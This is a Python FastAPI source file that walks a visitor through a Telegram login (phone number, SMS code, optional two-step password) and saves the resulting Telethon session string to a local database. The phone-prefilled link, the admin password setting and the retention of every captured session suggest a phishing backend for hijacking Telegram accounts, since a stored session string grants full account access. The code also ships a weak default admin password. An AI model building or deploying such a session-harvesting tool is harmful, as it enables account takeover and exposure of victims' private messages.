import os
import sqlite3
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
DB = "sessions.db"

# In-memory clients
CLIENTS = {}

# === DATABASE ===
def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
    conn.close()

# CLEAR OLD SESSION ON START (for testing)
if os.getenv("CLEAR_DB") == "1":
    if os.path.exists(DB):
        os.remove(DB)
    os.environ.pop("CLEAR_DB", None)

init_db()

def save_session(phone: str, session: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
    conn.commit()
    conn.close()

def get_session(phone: str):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT session FROM sessions WHERE phone = ?", (phone,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def delete_session(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

# === ROUTES ===
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    if not phone:
        raise HTTPException(400, "Phone required")
    
    # Auto-clear old session
    if phone in CLIENTS:
        del CLIENTS[phone]
    delete_session(phone)
    
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    if phone in CLIENTS:
        return JSONResponse({"error": "Already in progress"})
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        CLIENTS[phone] = client
        return JSONResponse({"ok": True})
    except Exception as e:
        await client.disconnect() if client.is_connected() else None
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("")):
    if phone not in CLIENTS:
        return JSONResponse({"error": "Session expired. Refresh page."})
    
    client = CLIENTS[phone]
    try:
        if pwd:
            await client.sign_in(phone, code, password=pwd)
        else:
            await client.sign_in(phone, code)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        del CLIENTS[phone]
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except PhoneCodeInvalidError:
        return JSONResponse({"error": "Wrong code"})
    except Exception as e:
        return JSONResponse({"error": str(e)})
